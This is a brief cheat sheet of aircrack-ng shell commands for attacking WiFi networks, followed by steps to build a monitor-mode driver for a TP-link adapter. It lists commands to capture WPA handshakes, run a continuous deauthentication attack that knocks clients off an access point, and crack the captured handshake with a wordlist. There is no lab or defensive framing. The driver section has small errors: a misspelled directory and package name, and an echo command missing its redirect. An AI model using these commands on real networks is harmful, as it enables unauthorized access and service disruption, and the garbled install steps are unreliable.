__Set WiFi Adapter to monitor mode__
```
iwconfig <interface> mode monitor
```
__Start monitoring with airodump-ng__
```
airodump-ng <interface>
```

__Listen for WiFi handshake__
``` 
airodump-ng -c <channel> --bssid <access point MAC> -w <file-name> <interface>
``` 

__Change interface channel__
```
iwconfig <interface> channel <channel-id>
````

__Deauth the access point clients__
```
aireplay-ng --deauth 0 -a <bssid> <interface>
```

__Crack captured handshake__
```
aircrack-ng -w <word-list> <captured file>
```

---
### Enable monitor mode on TP-link TL-WN22N

```sh
# sudo apt install build-essential libelf-dev linux-headers-`uname -r` dmks
# sudo rmmod r8188eu.ko
# git clone https://github.com/aircrack-ng/rtl8188eus
# cd rt8188eus
# sudo -i
# echo "blacklist r8188eus" "/etc/modprobe.d"
# 
# sudo apt update
# cd rt8188eus
# sudo make
# sudo make install
# sudo modprobe 8188eu
```